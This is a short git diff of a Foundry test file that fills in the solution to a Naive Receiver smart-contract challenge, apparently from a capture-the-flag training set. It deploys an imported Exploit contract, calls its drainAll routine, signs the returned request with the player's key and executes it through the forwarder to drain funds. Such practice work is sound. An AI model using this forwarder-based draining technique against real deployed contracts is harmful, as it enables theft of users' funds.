@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {Exploit} from "./NaiveReceiver_exploiter.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,12 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+     Exploit attacker = new Exploit(address(recovery),weth,pool,address(receiver),deployer,player,forwarder);
+     (bytes32 _finalhash,BasicForwarder.Request memory collectdata) = attacker.drainAll(); 
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, _finalhash);
+     bytes memory signature = abi.encodePacked(r, s, v);
+     forwarder.execute(collectdata, signature);
+   
     }
 
     /**
